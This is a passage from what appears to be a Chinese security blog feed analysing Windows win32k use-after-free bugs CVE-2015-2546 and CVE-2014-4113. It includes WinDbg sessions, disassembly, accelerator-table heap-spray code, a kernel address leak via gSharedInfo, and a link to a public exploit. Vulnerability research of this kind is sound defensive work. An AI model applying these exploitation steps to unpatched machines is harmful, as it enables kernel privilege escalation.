0)</code>销毁了窗口对象之后，很显然，该对象被释放，然后PopupMenu作为参数传入xxxMNHideNextHierarchy，会对popupmenu的spwndNextPopup成员进行判断，为空则直接退出，所以，只需要伪造PopupMenu对象，就可以实现对这块内存的控制。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">kd&gt; g</div><div class="line">Breakpoint 0 hit</div><div class="line">win32k!xxxMNMouseMove+0xe6:</div><div class="line">95ab821f 8b9eb0000000    mov     ebx,dword ptr [esi+0B0h]</div><div class="line">kd&gt; r esi</div><div class="line"><span class="attribute">esi</span>=fe8109a8</div><div class="line">kd&gt; dc fe8109a8+B0</div><div class="line">ReadVirtual: fe810a58 <span class="keyword">not</span> properly sign extended</div><div class="line">fe810a58  fe78d9a8 006e0057 00010017 08000018  <span class="built_in">..</span>x.W.n<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</div><div class="line">fe810a68  0013019c 0000000b ff5e42c8 87daca18  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.B^<span class="built_in">..</span><span class="built_in">..</span>.</div><div class="line">fe810a78  fe810a68 60080018 80000700 00000100  h<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>`<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></div><div class="line">fe810a88  04c00000 00000000 00000000 fe810b20  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span> <span class="built_in">..</span>.</div><div class="line">fe810a98  fe8069e8 fe800618 00000000 00000000  .i<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></div><div class="line">d&gt; !pool fe78d9a8 </div><div class="line">Pool<span class="built_in"> page </span>fe78d9a8 region is Unknown</div><div class="line"> fe78d000 size:   d0 previous size:    0  (Allocated)  Gpff</div><div class="line">[<span class="built_in">..</span><span class="built_in">..</span>.]</div><div class="line"> fe78d628 size:  2e0 previous size:   d0  (Allocated)  Ttfd</div><div class="line"> fe78d908 size:   50 previous size:  2e0  (Allocated)  Ttfd</div><div class="line"> fe78d958 size:   48 previous size:   50  (Allocated)  Gffv</div><div class="line"><span class="number">*fe78d9a0</span> size:   40 previous size:   48  (Free ) *Uspm Process: 88877030</div><div class="line">Pooltag Uspm : USERTAG_POPUPMENU, Binary : win32k!MNAllocPopup</div><div class="line"> fe78d9e0 size:   10 previous size:   40  (Allocated)  Glnk</div><div class="line"> fe78d9f0 size:   70 previous size:   10  (Allocated)  Ghab</div><div class="line">[<span class="built_in">..</span><span class="built_in">..</span>.]</div></pre></td></tr></table></figure></p><h2 id="0x02-漏洞利用及验证"><a href="#0x02-漏洞利用及验证" class="headerlink" title="0x02 漏洞利用及验证"></a>0x02 漏洞利用及验证</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;总结一下CVE-2015-2546的漏洞利用，通过伪造PopupMenu对象，去占用销毁窗口对象留下的内存空洞，从而实现漏洞利用。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;现在，整个逻辑就很清楚了，首先通过加速键表，占用一大段内存空间,每次申请5个ACCEL的大小，一共申请50次，然后释放部分加速键表，造成内存空洞，然后创建的窗口对象便会占用其中一个内存空洞中。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">LPACCELlpAccel = (<span class="name">LPACCEL</span>)LocalAlloc(<span class="name">LPTR</span>, sizeof(<span class="name">ACCEL</span>) * 0x5);// 大小 0x8 * <span class="number">0</span>x5 = <span class="number">0</span>x28 与 tagPOPUPMENU 大小相同</div><div class="line">for (<span class="name">int</span> i = <span class="number">0</span><span class="comment">; i &lt; 50; i++)</span></div><div class="line">&#123;</div><div class="line">hAccel[i] = CreateAcceleratorTable(<span class="name">lpAccel</span>, <span class="number">0</span>x5)<span class="comment">;</span></div><div class="line">index = LOWORD(<span class="name">hAccel</span>[i])<span class="comment">;</span></div><div class="line">Address = <span class="symbol">&amp;gHandleTable</span>[index]<span class="comment">;</span></div><div class="line">pAcceleratorTable[i] = (<span class="name">PUCHAR</span>)Address-&gt;pKernel<span class="comment">;</span></div><div class="line">printf(<span class="string">"[+] Create Accelerator pKernelAddress at : 0x%p\n"</span>, pAcceleratorTable[i])<span class="comment">;</span></div><div class="line">&#125;</div><div class="line">// 释放双数的加速键表,制造空洞</div><div class="line">for (<span class="name">int</span> i = <span class="number">2</span><span class="comment">; i &lt; 50; i = i + 5)</span></div><div class="line">&#123;</div><div class="line">DestroyAcceleratorTable(<span class="name">hAccel</span>[i])<span class="comment">;</span></div><div class="line">printf(<span class="string">"[+] Destroy Accelerator pKernelAddress at : 0x%p\n"</span>, pAcceleratorTable[i])<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将占用的内存地址打印出来，并在windbg中输出tagWnd2的PopupMenu对象地址为<code>fe440168</code>，很显然，新创建的窗口对象占用了之前释放的内存空洞。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">[+] Create Accelerator pKernelAddress at : 0xFFA27058</div><div class="line">[<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>]</div><div class="line">[+] Create Accelerator pKernelAddress at : 0xFE48C290</div><div class="line">[+] Create Accelerator pKernelAddress at : 0xFF49CA70</div><div class="line">[+] Create Accelerator pKernelAddress at : 0xFF52FBE8</div><div class="line">[+] Create Accelerator pKernelAddress at : 0xFF589128</div><div class="line">[+] Create Accelerator pKernelAddress at : 0xFF58B128</div><div class="line">[+] Create Accelerator pKernelAddress at : 0xFF55F120</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFF4AC7F8</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFE486BC8</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFD36D288</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFE440168  &lt;---</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFE6A94E8</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFD392A70</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFF5A10E0</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFD351170</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFF51B960</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFF589128</div><div class="line">[+] hWnd2 Address: 0x00D62B58</div><div class="line">[+] tagWnd2 at pKernel<span class="built_in"> Address </span>: 0xFE812B58</div><div class="line">kd&gt; DC FE812B58+b0</div><div class="line">ReadVirtual: fe812c08 <span class="keyword">not</span> properly sign extended</div><div class="line">fe812c08  fe440168 00000013 0000000a 00000018  h.D<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</div><div class="line">fe812c18  fe80ab70 fe80f1b0 00000000 00000000  p<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</div><div class="line">fe812c28  00000000 00000000 00000000 00000000  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></div><div class="line">fe812c38  00000000 00000000 00000000 00000000  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></div><div class="line">fe812c48  002c024b 00000000 00000000 00000000  K.,<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;泄露加速表地址可以借助<code>SHAREDINFO</code>结构体的PUSER_HANDLE_ENTRY成员，这是ENTRY可以理解为一张句柄表。而每一个USER_HANDLE_ENTRY第一个成员pKernel则指向内存地址。<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">typedef struct _SHAREDINFO &#123;</div><div class="line">PSERVERINFO psi<span class="comment">;</span></div><div class="line">PUSER_HANDLE_ENTRY aheList<span class="comment">;</span></div><div class="line">ULONG HeEntrySize<span class="comment">;</span></div><div class="line">ULONG_PTR pDispInfo<span class="comment">;</span></div><div class="line">ULONG_PTR ulSharedDelts<span class="comment">;</span></div><div class="line">ULONG_PTR awmControl<span class="comment">;</span></div><div class="line">ULONG_PTR DefWindowMsgs<span class="comment">;</span></div><div class="line">ULONG_PTR DefWindowSpecMsgs<span class="comment">;</span></div><div class="line">&#125; <span class="keyword">SHAREDINFO, </span>*PSHAREDINFO<span class="comment">;</span></div><div class="line">typedef struct _USER_HANDLE_ENTRY &#123;</div><div class="line">void* pKernel<span class="comment">;</span></div><div class="line">union</div><div class="line">&#123;</div><div class="line">PVOID pi<span class="comment">;</span></div><div class="line">PVOID pti<span class="comment">;</span></div><div class="line">PVOID ppi<span class="comment">;</span></div><div class="line">&#125;<span class="comment">;</span></div><div class="line"><span class="keyword">BYTE </span>type<span class="comment">;</span></div><div class="line"><span class="keyword">BYTE </span>flags<span class="comment">;</span></div><div class="line">WORD generation<span class="comment">;</span></div><div class="line">&#125; USER_HANDLE_ENTRY, *PUSER_HANDLE_ENTRY<span class="comment">;</span></div></pre></td></tr></table></figure></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">PSHAREDINFO pSharedInfo = (<span class="name">PSHAREDINFO</span>)GetProcAddress(<span class="name">GetModuleHandleA</span>(<span class="string">"user32.dll"</span>), <span class="string">"gSharedInfo"</span>)<span class="comment">;</span></div><div class="line">printf(<span class="string">"[+] gSharedInfo at : 0x%p\n"</span>, pSharedInfo)<span class="comment">;</span></div><div class="line">PUSER_HANDLE_ENTRY gHandleTable = pSharedInfo-&gt;aheList<span class="comment">;</span></div><div class="line">LPACCELlpAccel = (<span class="name">LPACCEL</span>)LocalAlloc(<span class="name">LPTR</span>, sizeof(<span class="name">ACCEL</span>) * 0x5);// 大小 0x8 * <span class="number">0</span>x5 = <span class="number">0</span>x28 与 tagPOPUPMENU 大小相同</div><div class="line">for (<span class="name">int</span> i = <span class="number">0</span><span class="comment">; i &lt; 50; i++)</span></div><div class="line">&#123;</div><div class="line">hAccel[i] = CreateAcceleratorTable(<span class="name">lpAccel</span>, <span class="number">0</span>x5)<span class="comment">;</span></div><div class="line">index = LOWORD(<span class="name">hAccel</span>[i])<span class="comment">;</span></div><div class="line">Address = <span class="symbol">&amp;gHandleTable</span>[index]<span class="comment">;</span></div><div class="line">pAcceleratorTable[i] = (<span class="name">PUCHAR</span>)Address-&gt;pKernel<span class="comment">;</span></div><div class="line">printf(<span class="string">"[+] Create Accelerator pKernelAddress at : 0x%p\n"</span>, pAcceleratorTable[i])<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很显然，原先的tagWnd对象已经被销毁，由新申请的加速键内存占用。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">kd&gt; dc ebx</div><div class="line">fe440168  001c0253 00000000 00000000 00000005  S<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</div><div class="line">fe440178  00000000 00000000 00000000 00000000  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></div><div class="line">fe440188  00000000 00000000 00000080 00000000  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></div><div class="line">fe440198  00000000 86111030 46140008 38616c47  <span class="built_in">..</span><span class="built_in">..</span>0<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>FGla8</div><div class="line">fe4401a8  04080934 00000001 80000000 00000000  4<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</div><div class="line">fe4401b8  00008208 00000000 0000907f 00000000  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></div><div class="line">fe4401c8  00000000 00000000 00000000 00000001  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></div><div class="line">fe4401d8  00000000 00000000 00000000 95a30d56  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>V<span class="built_in">..</span>.</div><div class="line">kd&gt; t</div><div class="line">win32k!xxxMNMouseMove+0x153:</div><div class="line">95ab828c e86e1effff      call    win32k!xxxMNHideNextHierarchy (95aaa0ff)</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>win32k!xxxMNHideNextHierarchy</code>中调用<code>win32k!xxxSendMessage</code>此时传入的对象是伪造的加速键表。剩下的就和CVE-2014-4113差不多的利用方式，区别就是4113的对象是0xFFFFFFFB。<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">kd&gt; </div><div class="line">win<span class="number">32</span>k<span class="title">!xxxMNHideNextHierarchy</span>+<span class="number">0x41</span>:</div><div class="line"><span class="number">95</span>aaa<span class="number">140</span> e<span class="number">837</span>a<span class="number">5</span>f<span class="number">9</span>ff      <span class="keyword">call</span>    win<span class="number">32</span>k<span class="title">!xxxSendMessage</span> (<span class="number">95</span>a<span class="number">4467</span><span class="keyword">c</span>)</div><div class="line">kd&gt; r eax</div><div class="line">eax=<span class="number">00000005</span></div></pre></td></tr></table></figure></p><h2 id="0x03-参考文献"><a href="#0x03-参考文献" class="headerlink" title="0x03 参考文献"></a>0x03 参考文献</h2><p>[1] <a href="https://xiaodaozhi.com/exploit/122.html" target="_blank" rel="external">对 UAF 漏洞 CVE-2015-2546 的分析和利用</a> ： 小刀师傅对于win32k机制的剖析</p><p>[2] <a href="https://www.anquanke.com/post/id/84911" target="_blank" rel="external">https://www.anquanke.com/post/id/84911</a> ： k0shl师傅调试UAF的细节</p><p>[3] <a href="https://xz.aliyun.com/t/6115" target="_blank" rel="external">https://xz.aliyun.com/t/6115</a> ： thunderjie师傅提供的信息泄露的方法,即查看加速键表地址的方法。</p><p>[4] <a href="https://github.com/ThunderJie/CVE/blob/master/CVE-2015-2546/2015-2546.c" target="_blank" rel="external">https://github.com/ThunderJie/CVE/blob/master/CVE-2015-2546/2015-2546.c</a> : ThunderJie 提供的 exp</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言及原因分析&quot;&gt;&lt;a href=&quot;#0x00-前言及原因分析&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言及原因分析&quot;&gt;&lt;/a&gt;0x00 前言及原因分析&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;CVE-2015-2546是发生在&lt;code&gt;win32k!xxxMNMouseMove&lt;/code&gt;函数的一个释放后重引用漏洞(UAF),在&lt;code&gt;win32k!xxxMNMouseMove&lt;/code&gt;中调用xxxSendMessage发送&lt;code&gt;MN_SELECTITEM(0x1E5)&lt;/code&gt;和&lt;code&gt;MN_SETTIMERTOOPENHIERARCHY(0x1F0)&lt;/code&gt;消息的时候，执行流可能会回调进入用户侧，当执行流从用户侧返回之后，&lt;code&gt;win32k!xxxMNMouseMove&lt;/code&gt;函数并没有对&lt;code&gt;tagPopupMenu&lt;/code&gt;对象进行校验，就将其传入&lt;code&gt;win32k!xxxMNHideNextHierarchy&lt;/code&gt;对其进行了访问，从而引用UAF。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://findream.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2014-4113内核提权漏洞分析</title>
    <link href="https://findream.github.io/2022/07/26/CVE-2014-4113%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://findream.github.io/2022/07/26/CVE-2014-4113内核提权漏洞分析/</id>
    <published>2022-07-26T06:02:11.000Z</published>
    <updated>2022-10-23T12:41:57.213Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-2014-4113是Win32k下的释放后重引用漏洞(UAF)，该漏洞位于<code>win32k!xxxHandleMenuMessages</code>中，通过调用<code>win32k!xxxMNFindWindowFromPoint</code>获取tagWnd指针，在此期间，执行流通过回调机制，返回用户侧，在用户侧释放目标菜单对象，并返回<code>0xFFFFFFFB</code>。当执行流重新返回内核侧，<br>并没有针对返回值进行校验，直接使用该返回值作为参数传入<code>win32k!xxxSendMessage</code>发送<code>MN_BUTTONDOWN</code>消息，由此造成UAF。</p><a id="more"></a><h2 id="0x01-原因分析"><a href="#0x01-原因分析" class="headerlink" title="0x01 原因分析"></a>0x01 原因分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本文通过crash寻找漏洞触发的原理，实验环境为win7(x86)sp1。运行poc之后。在<code>win32k!xxxSendMessageTimeout+0xb3</code>处crash。<br><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">nt!RtlpBreakWithStatusInstruction:</div><div class="line"><span class="number">83e6</span>d394 cc              int     <span class="number">3</span></div><div class="line">kd&gt; G</div><div class="line">Access violation - code c0000005 (!!! second chance !!!)</div><div class="line">win32k!xxxSendMessageTimeout+<span class="number">0</span>xb3:</div><div class="line"><span class="number">94</span>a54760 <span class="number">3</span>b7e08          cmp     edi,dword ptr [esi+<span class="number">8</span>]</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过栈回溯，可以清晰的看到漏洞如何从用户层到内核的执行流。显然，该漏洞是在<code>win32k!xxxSendMessageTimeout</code>函数内部crash。<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">kd&gt; kn</div><div class="line"> # ChildEBP RetAddr      </div><div class="line"><span class="number">00</span> <span class="number">96</span>cb<span class="number">9</span>b<span class="number">64</span> <span class="number">94</span>a<span class="number">546</span>a<span class="number">4</span>     win<span class="number">32</span>k<span class="title">!xxxSendMessageTimeout</span>+<span class="number">0xb3</span></div><div class="line"><span class="number">01</span> <span class="number">96</span>cb<span class="number">9</span>b<span class="number">8</span><span class="keyword">c</span> <span class="number">94</span>ac<span class="number">8045</span>     win<span class="number">32</span>k<span class="title">!xxxSendMessage</span>+<span class="number">0x28</span></div><div class="line"><span class="number">02</span> <span class="number">96</span>cb<span class="number">9</span>bec <span class="number">94</span>abfa<span class="number">64</span>     win<span class="number">32</span>k<span class="title">!xxxHandleMenuMessages</span>+<span class="number">0x582</span></div><div class="line"><span class="number">03</span> <span class="number">96</span>cb<span class="number">9</span><span class="keyword">c</span><span class="number">38</span> <span class="number">94</span>acf<span class="number">71</span>b     win<span class="number">32</span>k<span class="title">!xxxMNLoop</span>+<span class="number">0x2c6</span></div><div class="line"><span class="number">04</span> <span class="number">96</span>cb<span class="number">9</span>ca<span class="number">0</span> <span class="number">94</span>ac<span class="number">58</span>a<span class="number">5</span>     win<span class="number">32</span>k<span class="title">!xxxTrackPopupMenuEx</span>+<span class="number">0x5cd</span></div><div class="line"><span class="number">05</span> <span class="number">96</span>cb<span class="number">9</span>d<span class="number">14</span> <span class="number">83e4542</span>a     win<span class="number">32</span>k<span class="title">!NtUserTrackPopupMenuEx</span>+<span class="number">0xc3</span></div><div class="line"><span class="number">06</span> <span class="number">96</span>cb<span class="number">9</span>d<span class="number">14</span> <span class="number">77</span>ce<span class="number">64</span>f<span class="number">4</span> (T) nt<span class="title">!KiFastCallEntry</span>+<span class="number">0x12a</span></div><div class="line"><span class="number">07</span> <span class="number">003</span>bf<span class="number">678</span> <span class="number">775</span>b<span class="number">5</span>f<span class="number">7</span>e (T) ntdll<span class="title">!KiFastSystemCallRet</span></div><div class="line"><span class="number">08</span> <span class="number">003</span>bf<span class="number">67</span><span class="keyword">c</span> <span class="number">775</span>b<span class="number">4</span>b<span class="number">56</span>     user<span class="number">32</span><span class="title">!NtUserTrackPopupMenuEx</span>+<span class="number">0xc</span></div><div class="line"><span class="number">09</span> <span class="number">003</span>bf<span class="number">69</span><span class="keyword">c</span> <span class="number">000</span>f<span class="number">12</span>ba     user<span class="number">32</span><span class="title">!TrackPopupMenu</span>+<span class="number">0x1b</span></div><div class="line">WARNING: Frame IP not in any known <span class="keyword">module</span>. Following frames</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据异常信息，然后esi值为<code>fffffffb</code>,查看反汇编情况，esi的值源于<code>win32k!xxxSendMessageTimeout</code>的第一个参数，并最终发现产生漏洞的原因在于<code>xxxMNFindWindowFromPoint</code>函数的返回值，复制给ebx，并且没有进行必要的校验,就作为参数传入xxxSendMessage发送<code>MN_BUTTONDOWN</code>消息。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC7B52</span>                 <span class="selector-tag">mov</span>     <span class="selector-attr">[esi+0Ch]</span>, <span class="selector-tag">eax</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC7B55</span>                 <span class="selector-tag">push</span>    <span class="selector-tag">ebx</span>             ; <span class="selector-tag">a3</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC7B56</span>                 <span class="selector-tag">lea</span>     <span class="selector-tag">eax</span>, <span class="selector-attr">[ebp+tagPopupMenu]</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC7B59</span>                 <span class="selector-tag">push</span>    <span class="selector-tag">eax</span>             ; <span class="selector-tag">a2</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC7B5A</span>                 <span class="selector-tag">push</span>    <span class="selector-tag">edi</span>             ; <span class="selector-tag">tagpopupmenu</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC7B5B</span>                 <span class="selector-tag">call</span>    _<span class="selector-tag">xxxMNFindWindowFromPoint</span>@<span class="keyword">12</span> ; <span class="selector-tag">xxxMNFindWindowFromPoint</span>(<span class="selector-tag">x</span>,<span class="selector-tag">x</span>,<span class="selector-tag">x</span>)</div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC7B60</span>                 <span class="selector-tag">mov</span>     <span class="selector-tag">ebx</span>, <span class="selector-tag">eax</span></div><div class="line"><span class="selector-attr">[....]</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC8035</span> <span class="selector-tag">loc_94AC8035</span>:                           ; <span class="selector-tag">CODE</span> <span class="selector-tag">XREF</span>: <span class="selector-tag">xxxHandleMenuMessages</span>(<span class="selector-tag">x</span>,<span class="selector-tag">x</span>,<span class="selector-tag">x</span>)+563↑<span class="selector-tag">j</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC8035</span>                 <span class="selector-tag">push</span>    0</div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC8037</span>                 <span class="selector-tag">push</span>    <span class="selector-attr">[ebp+tagPopupMenu]</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC803A</span>                 <span class="selector-tag">push</span>    1<span class="selector-tag">EDh</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC803F</span>                 <span class="selector-tag">push</span>    <span class="selector-tag">ebx</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC8040</span>                 <span class="selector-tag">call</span>    _<span class="selector-tag">xxxSendMessage</span>@<span class="keyword">16</span> ; <span class="selector-tag">xxxSendMessage</span>(<span class="selector-tag">x</span>,<span class="selector-tag">x</span>,<span class="selector-tag">x</span>,<span class="selector-tag">x</span>)</div></pre></td></tr></table></figure></p><h2 id="0x02-poc构建"><a href="#0x02-poc构建" class="headerlink" title="0x02 poc构建"></a>0x02 poc构建</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据栈回溯以及微软提供的漏洞信息，可以知道该漏洞发生在<code>win32k!xxxHandleMenuMessages</code>,在用户层触发该漏洞的函数是<code>user32!TrackPopupMenu</code>。<code>TrackPopupMenu</code>的函数原型如下,其作用是在任何地方显示快捷菜单和跟踪菜单的选择。<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">BOOL</span> TrackPopupMenu(</div><div class="line">  [<span class="keyword">in</span>]           HMENU      hMenu,   <span class="comment">//菜单句柄</span></div><div class="line">  [<span class="keyword">in</span>]           <span class="built_in">UINT</span>       uFlags,  </div><div class="line">  [<span class="keyword">in</span>]           <span class="keyword">int</span>        x,</div><div class="line">  [<span class="keyword">in</span>]           <span class="keyword">int</span>        y,</div><div class="line">  [<span class="keyword">in</span>]           <span class="keyword">int</span>        nReserved,</div><div class="line">  [<span class="keyword">in</span>]           HWND       hWnd,    <span class="comment">//拥有快捷菜单的窗口句柄</span></div><div class="line">  [<span class="keyword">in</span>, optional] <span class="keyword">const</span> RECT *prcRect</div><div 